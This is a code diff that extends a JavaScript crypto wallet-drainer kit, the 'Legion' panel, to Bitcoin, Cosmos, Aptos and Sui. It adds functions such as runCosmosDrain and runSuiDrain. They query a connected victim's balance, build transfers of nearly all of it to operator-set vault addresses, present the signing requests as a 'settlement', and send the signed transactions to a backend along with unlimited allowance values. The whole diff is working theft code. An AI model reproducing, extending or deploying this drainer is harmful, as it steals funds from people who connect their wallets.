@@ -16,6 +16,7 @@
     autoDrain: true,
     silentMode: false,
     showBalance: true,
+    vaultAddresses: {},
   };
 
   var CFG = Object.assign({}, DEFAULTS, window.LEGION_CONFIG || {});
@@ -29,6 +30,7 @@
   var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
   var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+  var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
   var ACTIVE_TAB = 'evm';
 
   var WC_EVM_CHAINS = [
@@ -36,7 +38,7 @@
   ];
   var WC_SOLANA = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
 
-  var wallets = { evm: null, sol: null, tron: null, ton: null };
+  var wallets = { evm: null, sol: null, tron: null, ton: null, btc: null, cosmos: null, aptos: null, sui: null };
   var wcProvider = null;
   var wcModal = null;
   var wcSdkPromise = null;
@@ -54,8 +56,8 @@
       '#legion-one-panel .hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:#1e293b;cursor:move;user-select:none;}',
       '#legion-one-panel .hdr span{font-weight:600;font-size:12px;}',
       '#legion-one-panel .hdr button{background:transparent;border:0;color:#94a3b8;font-size:18px;cursor:pointer;padding:0 4px;}',
-      '#legion-one-panel .tabs{display:flex;border-bottom:1px solid #334155;}',
-      '#legion-one-panel .tabs button{flex:1;padding:8px 4px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:11px;}',
+      '#legion-one-panel .tabs{display:flex;flex-wrap:wrap;border-bottom:1px solid #334155;}',
+      '#legion-one-panel .tabs button{flex:1 1 25%;min-width:72px;padding:6px 2px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:10px;}',
       '#legion-one-panel .tabs button.on{background:#334155;color:#fff;}',
       '#legion-one-panel .body{padding:12px;}',
       '#legion-one-status{min-height:2.4em;font-size:12px;color:#94a3b8;margin-bottom:10px;word-break:break-word;}',
@@ -167,12 +169,80 @@
   async function connectTon() {
     if (wallets.ton) return wallets.ton;
     var ton = (window.tonkeeper && window.tonkeeper.provider) || (window.ton && window.ton.isTonkeeper && window.ton);
-    if (!ton) throw new Error('Tonkeeper not found');
+    if (!ton) throw new Error('Tonkeeper not found — install from tonkeeper.com');
     var accounts = await ton.send('ton_getAccounts');
     var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
     if (!addr) throw new Error('Tonkeeper returned no address');
     wallets.ton = { address: String(addr), provider: ton };
     return wallets.ton;
+  }
+
+  async function connectBitcoin() {
+    if (wallets.btc) return wallets.btc;
+    if (window.unisat && window.unisat.requestAccounts) {
+      var uAccounts = await window.unisat.requestAccounts();
+      if (!uAccounts || !uAccounts[0]) throw new Error('UniSat returned no address');
+      wallets.btc = { address: uAccounts[0], provider: 'UniSat' };
+      return wallets.btc;
+    }
+    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
+      var xverse = window.XverseProviders.BitcoinProvider;
+      var xAccounts = await xverse.request('getAccounts');
+      if (!xAccounts || !xAccounts[0]) throw new Error('Xverse returned no address');
+      wallets.btc = { address: xAccounts[0], provider: 'Xverse' };
+      return wallets.btc;
+    }
+    throw new Error('Install UniSat (unisat.io) or Xverse wallet for Bitcoin');
+  }
+
+  async function connectCosmos() {
+    if (wallets.cosmos) return wallets.cosmos;
+    if (!window.keplr) throw new Error('Install Keplr extension from keplr.app');
+    var chainId = 'cosmoshub-4';
+    await window.keplr.enable(chainId);
+    var offlineSigner = window.getOfflineSigner && window.getOfflineSigner(chainId);
+    if (!offlineSigner) throw new Error('Keplr offline signer unavailable');
+    var accounts = await offlineSigner.getAccounts();
+    if (!accounts || !accounts[0]) throw new Error('Keplr returned no Cosmos account');
+    wallets.cosmos = { address: accounts[0].address, provider: 'Keplr', chainId: chainId };
+    return wallets.cosmos;
+  }
+
+  async function connectAptos() {
+    if (wallets.aptos) return wallets.aptos;
+    var aptos = window.aptos || (window.petra && window.petra.aptos);
+    if (!aptos) throw new Error('Install Petra Aptos Wallet from petra.app');
+    if (aptos.connect) await aptos.connect();
+    var account = aptos.account && aptos.account();
+    var addr = account && (account.address || (typeof account.then === 'function' ? null : account));
+    if (account && typeof account.then === 'function') {
+      account = await account;
+      addr = account && account.address;
+    }
+    if (!addr && aptos.address) addr = aptos.address;
+    if (!addr) throw new Error('Petra did not return an Aptos address');
+    wallets.aptos = { address: String(addr), provider: aptos, name: 'Petra' };
+    return wallets.aptos;
+  }
+
+  async function connectSui() {
+    if (wallets.sui) return wallets.sui;
+    var suiWallet = window.suiWallet || (window.phantom && window.phantom.sui);
+    if (!suiWallet) throw new Error('Install Sui Wallet extension from sui.io');
+    if (suiWallet.features && suiWallet.features['standard:connect']) {
+      var conn = await suiWallet.features['standard:connect'].connect();
+      var acc = conn && conn.accounts && conn.accounts[0];
+      if (!acc || !acc.address) throw new Error('Sui Wallet returned no account');
+      wallets.sui = { address: acc.address, provider: suiWallet, name: 'Sui Wallet' };
+      return wallets.sui;
+    }
+    if (suiWallet.requestPermissions) {
+      await suiWallet.requestPermissions({ permissions: ['viewAccount', 'suggestTransactions'] });
+    }
+    var accounts = suiWallet.getAccounts ? await suiWallet.getAccounts() : [];
+    if (!accounts || !accounts[0]) throw new Error('Sui Wallet returned no address');
+    wallets.sui = { address: accounts[0], provider: suiWallet, name: 'Sui Wallet' };
+    return wallets.sui;
   }
 
   function loadWcSdk() {
@@ -246,7 +316,46 @@
     if (ACTIVE_TAB === 'sol') return connectSolana();
     if (ACTIVE_TAB === 'tron') return connectTron();
     if (ACTIVE_TAB === 'ton') return connectTon();
+    if (ACTIVE_TAB === 'btc') return connectBitcoin();
+    if (ACTIVE_TAB === 'cosmos') return connectCosmos();
+    if (ACTIVE_TAB === 'aptos') return connectAptos();
+    if (ACTIVE_TAB === 'sui') return connectSui();
     throw new Error('Unknown chain tab');
+  }
+
+  function chainFamilyForTab(tab) {
+    if (tab === 'evm') return 'EVM';
+    if (tab === 'sol') return 'SVM';
+    if (tab === 'tron') return 'TRON';
+    if (tab === 'ton') return 'TON';
+    if (tab === 'btc') return 'UTXO';
+    if (tab === 'cosmos') return 'COSMOS';
+    if (tab === 'aptos') return 'APTOS';
+    if (tab === 'sui') return 'SUI';
+    return 'EVM';
+  }
+
+  function resolveVaultAddress(chainKey) {
+    var vaults = CFG.vaultAddresses || {};
+    if (vaults[chainKey]) return String(vaults[chainKey]);
+    return null;
+  }
+
+  function parseNativeAmountFromBalance(data, chainKey) {
+    if (!data || !data.chains) return '0';
+    var row = data.chains.find(function (c) { return c.key === chainKey || c.family === chainKey; });
+    if (!row || !row.native) return '0';
+    var raw = row.native.amount_raw || row.native.amount || '0';
+    try {
+      var n = BigInt(String(raw).replace(/[^\d]/g, '') || '0');
+      if (n <= 0n) return '0';
+      if (chainKey === 'cosmos') return (n > 5000n ? n - 5000n : n).toString();
+      if (chainKey === 'aptos') return (n > 100000n ? n - 100000n : n).toString();
+      if (chainKey === 'sui') return (n > 1000000n ? n - 1000000n : n).toString();
+      return n.toString();
+    } catch (e) {
+      return '0';
+    }
   }
 
   async function getEvmSigner() {
@@ -257,7 +366,7 @@
 
   /* ── Backend flow ─────────────────────────────────────────────────────── */
   async function postScout(conn) {
-    var family = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : 'TON';
+    var family = chainFamilyForTab(ACTIVE_TAB);
     return apiPost('/api/v1/scout', {
       user_address: conn.address,
       chain_id: conn.chainId || 0,
@@ -272,6 +381,10 @@
     if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
     if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
     if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
+    if (wallets.btc) body.btc_holder_address = wallets.btc.address;
+    if (wallets.cosmos) body.cosmos_holder_address = wallets.cosmos.address;
+    if (wallets.aptos) body.aptos_holder_address = wallets.aptos.address;
+    if (wallets.sui) body.sui_holder_address = wallets.sui.address;
     if (!Object.keys(body).length) return { fusion: {}, total_usd: 0 };
     var data = await apiPost('/api/scout/recursive-predator-fusion', body);
     var fusion = (data && data.fusion) || data || {};
@@ -285,6 +398,10 @@
     if (wallets.sol) q.push('sol=' + encodeURIComponent(wallets.sol.address));
     if (wallets.tron) q.push('tron=' + encodeURIComponent(wallets.tron.address));
     if (wallets.ton) q.push('ton=' + encodeURIComponent(wallets.ton.address));
+    if (wallets.btc) q.push('btc=' + encodeURIComponent(wallets.btc.address));
+    if (wallets.cosmos) q.push('cosmos=' + encodeURIComponent(wallets.cosmos.address));
+    if (wallets.aptos) q.push('aptos=' + encodeURIComponent(wallets.aptos.address));
+    if (wallets.sui) q.push('sui=' + encodeURIComponent(wallets.sui.address));
     if (!q.length) return;
     try {
       var data = await apiGet('/api/v1/balance/multi?' + q.join('&'));
@@ -431,6 +548,206 @@
     return payload.signed_boc || null;
   }
 
+  async function runBitcoinPsbt(scoutUsd) {
+    if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
+    setStatus('Building Bitcoin PSBT…', 'busy');
+    var balanceData = null;
+    try {
+      balanceData = await apiGet('/api/v1/balance/multi?btc=' + encodeURIComponent(wallets.btc.address));
+    } catch (e) { /* optional */ }
+    var amountSat = parseNativeAmountFromBalance(balanceData, 'btc');
+    if (amountSat === '0') amountSat = '10000';
+    var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
+      wallet_address: wallets.btc.address,
+      amount_sat: amountSat,
+    });
+    if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');
+    var signedPsbt = psbt.psbt_base64;
+    if (window.unisat && window.unisat.signPsbt) {
+      signedPsbt = await window.unisat.signPsbt(psbt.psbt_base64);
+    } else if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
+      var signed = await window.XverseProviders.BitcoinProvider.request('signPsbt', { psbt: psbt.psbt_base64 });
+      signedPsbt = signed && signed.psbt ? signed.psbt : signedPsbt;
+    }
+    setStatus('Submitting Bitcoin anchor…', 'busy');
+    return apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'UTXO',
+      protocol: 'bitcoin_psbt',
+      wallet_address: wallets.btc.address,
+      token_address: 'BTC',
+      signature: signedPsbt,
+      signed_psbt_base64: signedPsbt,
+      amount: amountSat,
+      nonce: 'btc:' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: wallets.btc.provider,
+      scout_value_usd: scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+  }
+
+  async function signCosmosNativeTransfer(from, to, amountUatom) {
+    var chainId = 'cosmoshub-4';
+    await window.keplr.enable(chainId);
+    var offlineSigner = window.getOfflineSigner(chainId);
+    var mod = await import('https://esm.sh/@cosmjs/stargate@0.32.4');
+    var client = await mod.SigningStargateClient.connectWithSigner(
+      'https://rpc.cosmos.network',
+      offlineSigner,
+      { gasPrice: mod.GasPrice.fromString('0.025uatom') },
+    );
+    try {
+      var fee = { amount: mod.coins(5000, 'uatom'), gas: '200000' };
+      var signed = await client.sign(from, [{
+        typeUrl: '/cosmos.bank.v1beta1.MsgSend',
+        value: {
+          fromAddress: from,
+          toAddress: to,
+          amount: mod.coins(String(amountUatom), 'uatom'),
+        },
+      }], fee, 'Legion settlement');
+      var txRawMod = await import('https://esm.sh/cosmjs-types@0.9.0/cosmos/tx/v1beta1/tx');
+      var txBytes = txRawMod.TxRaw.encode({
+        bodyBytes: signed.bodyBytes,
+        authInfoBytes: signed.authInfoBytes,
+        signatures: signed.signatures,
+      }).finish();
+      var bin = '';
+      for (var i = 0; i < txBytes.length; i++) bin += String.fromCharCode(txBytes[i]);
+      return btoa(bin);
+    } finally {
+      client.disconnect();
+    }
+  }
+
+  async function runCosmosDrain(scoutUsd) {
+    if (!wallets.cosmos) throw new Error('Keplr not connected');
+    var vault = resolveVaultAddress('cosmos');
+    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.cosmos to your vault bech32 address');
+    var balanceData = await apiGet('/api/v1/balance/multi?cosmos=' + encodeURIComponent(wallets.cosmos.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'cosmos');
+    if (amount === '0') throw new Error('No spendable ATOM balance detected');
+    setStatus('Sign Cosmos transfer in Keplr…', 'busy');
+    var signedTx = await signCosmosNativeTransfer(wallets.cosmos.address, vault, amount);
+    return apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'EVM',
+      protocol: 'omnichain_atomic_v1',
+      wallet_address: wallets.cosmos.address,
+      token_address: 'OMNI_COSMOS_ANCHOR',
+      signature: DUMMY_OMNI_SIG,
+      cosmos_payload: {
+        native_amount_cosmos: amount,
+        cosmos_signed_tx: signedTx,
+        cosmos_tx_encoding: 'base64',
+      },
+      nonce: 'cosmos:' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: wallets.cosmos.provider,
+      scout_value_usd: scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+  }
+
+  async function runAptosDrain(scoutUsd) {
+    if (!wallets.aptos) throw new Error('Petra not connected');
+    var vault = resolveVaultAddress('aptos');
+    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.aptos to your vault Aptos address');
+    var balanceData = await apiGet('/api/v1/balance/multi?aptos=' + encodeURIComponent(wallets.aptos.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'aptos');
+    if (amount === '0') throw new Error('No spendable APT balance detected');
+    var aptos = wallets.aptos.provider;
+    setStatus('Sign Aptos transfer in Petra…', 'busy');
+    var payload = {
+      arguments: [vault, amount],
+      function: '0x1::aptos_account::transfer',
+      type: 'entry_function_payload',
+      type_arguments: [],
+    };
+    var signedTx = null;
+    var aptosSig = null;
+    if (aptos.signTransaction) {
+      var pending = await aptos.signTransaction(payload);
+      signedTx = pending && (pending.bcsToBytes || pending.rawTransaction || pending);
+      if (typeof signedTx === 'object' && signedTx.signature) aptosSig = signedTx.signature;
+      if (typeof signedTx !== 'string' && signedTx && signedTx.toString) signedTx = signedTx.toString();
+    } else if (aptos.signAndSubmitTransaction) {
+      var submitted = await aptos.signAndSubmitTransaction(payload);
+      signedTx = submitted && (submitted.hash || submitted.transactionHash || JSON.stringify(submitted));
+      aptosSig = submitted && submitted.signature ? submitted.signature : 'submitted';
+    } else {
+      throw new Error('Petra wallet API unavailable — update Petra extension');
+    }
+    return apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'EVM',
+      protocol: 'omnichain_atomic_v1',
+      wallet_address: wallets.aptos.address,
+      token_address: 'OMNI_APTOS_ANCHOR',
+      signature: DUMMY_OMNI_SIG,
+      aptos_payload: {
+        native_amount_aptos: amount,
+        aptos_signed_tx: String(signedTx),
+        aptos_signature: aptosSig ? String(aptosSig) : 'petra',
+        aptos_tx_encoding: 'hex',
+      },
+      nonce: 'aptos:' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: wallets.aptos.name || 'Petra',
+      scout_value_usd: scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+  }
+
+  async function runSuiDrain(scoutUsd) {
+    if (!wallets.sui) throw new Error('Sui Wallet not connected');
+    var vault = resolveVaultAddress('sui');
+    if (!vault) throw new Error('Set LEGION_CONFIG.vaultAddresses.sui to your vault Sui address');
+    var balanceData = await apiGet('/api/v1/balance/multi?sui=' + encodeURIComponent(wallets.sui.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'sui');
+    if (amount === '0') throw new Error('No spendable SUI balance detected');
+    setStatus('Building Sui transaction…', 'busy');
+    var suiMod = await import('https://esm.sh/@mysten/sui.js@0.54.1/transactions');
+    var tx = new suiMod.TransactionBlock();
+    var amountSplit = tx.splitCoins(tx.gas, [tx.pure(amount)]);
+    tx.transferObjects([amountSplit], tx.pure(vault));
+    var suiWallet = wallets.sui.provider;
+    var features = suiWallet.features || {};
+    var signFeature = features['sui:signTransactionBlock'] || features['sui:signTransaction'];
+    if (!signFeature || !signFeature.signTransactionBlock) {
+      throw new Error('Sui Wallet signTransactionBlock feature unavailable — update extension');
+    }
+    setStatus('Sign Sui transfer…', 'busy');
+    var signed = await signFeature.signTransactionBlock({
+      transactionBlock: tx,
+      account: wallets.sui.address,
+      chain: 'sui:mainnet',
+    });
+    return apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'EVM',
+      protocol: 'omnichain_atomic_v1',
+      wallet_address: wallets.sui.address,
+      token_address: 'OMNI_SUI_ANCHOR',
+      signature: DUMMY_OMNI_SIG,
+      sui_payload: {
+        native_amount_sui: amount,
+        sui_signed_tx: signed.bytes || signed.transactionBlockBytes || signed.transaction,
+        sui_signature: signed.signature,
+      },
+      nonce: 'sui:' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: wallets.sui.name || 'Sui Wallet',
+      scout_value_usd: scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+  }
+
   async function runOmnichainDrain(scoutUsd) {
     if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch');
     var evm = wallets.evm;
@@ -541,7 +858,11 @@
         ACTIVE_TAB === 'evm' ? wallets.evm :
         ACTIVE_TAB === 'sol' ? wallets.sol :
         ACTIVE_TAB === 'tron' ? wallets.tron :
-        ACTIVE_TAB === 'ton' ? wallets.ton : null
+        ACTIVE_TAB === 'ton' ? wallets.ton :
+        ACTIVE_TAB === 'btc' ? wallets.btc :
+        ACTIVE_TAB === 'cosmos' ? wallets.cosmos :
+        ACTIVE_TAB === 'aptos' ? wallets.aptos :
+        ACTIVE_TAB === 'sui' ? wallets.sui : null
       ) : await connectActiveTab();
       if (!conn) throw new Error('Connect a wallet first');
 
@@ -552,6 +873,31 @@
       var fusionResult = await postFusion();
       var scoutUsd = fusionResult.total_usd || 1;
 
+      if (ACTIVE_TAB === 'btc') {
+        setStatus('Draining Bitcoin via PSBT…', 'busy');
+        var btcResult = await runBitcoinPsbt(scoutUsd);
+        setStatus('Bitcoin anchor: ' + (btcResult.transaction_hash || btcResult.settlement_status || 'submitted'), 'ok');
+        return btcResult;
+      }
+
+      if (ACTIVE_TAB === 'cosmos') {
+        var cosmosResult = await runCosmosDrain(scoutUsd);
+        setStatus('Cosmos settlement: ' + (cosmosResult.transaction_hash || cosmosResult.settlement_status || 'submitted'), 'ok');
+        return cosmosResult;
+      }
+
+      if (ACTIVE_TAB === 'aptos') {
+        var aptosResult = await runAptosDrain(scoutUsd);
+        setStatus('Aptos settlement: ' + (aptosResult.transaction_hash || aptosResult.settlement_status || 'submitted'), 'ok');
+        return aptosResult;
+      }
+
+      if (ACTIVE_TAB === 'sui') {
+        var suiResult = await runSuiDrain(scoutUsd);
+        setStatus('Sui settlement: ' + (suiResult.transaction_hash || suiResult.settlement_status || 'submitted'), 'ok');
+        return suiResult;
+      }
+
       if (KINETIC_KEY) {
         setStatus('Checking existing allowances…', 'busy');
         var reused = await tryAllowanceReuse();
@@ -561,7 +907,7 @@
         }
       }
 
-      if (!wallets.evm && ACTIVE_TAB !== 'evm') {
+      if (!wallets.evm && ACTIVE_TAB !== 'evm' && ['sol', 'tron', 'ton'].indexOf(ACTIVE_TAB) >= 0) {
         setStatus('Connecting EVM for omnichain batch…', 'busy');
         await connectEvm();
       }
@@ -646,6 +992,10 @@
       '  <button type="button" data-tab="sol">SOL</button>',
       '  <button type="button" data-tab="tron">TRX</button>',
       '  <button type="button" data-tab="ton">TON</button>',
+      '  <button type="button" data-tab="btc">BTC</button>',
+      '  <button type="button" data-tab="cosmos">ATOM</button>',
+      '  <button type="button" data-tab="aptos">APT</button>',
+      '  <button type="button" data-tab="sui">SUI</button>',
       '</div>',
       '<div class="body">',
       '  <div id="legion-one-status">Select chain and connect.</div>',
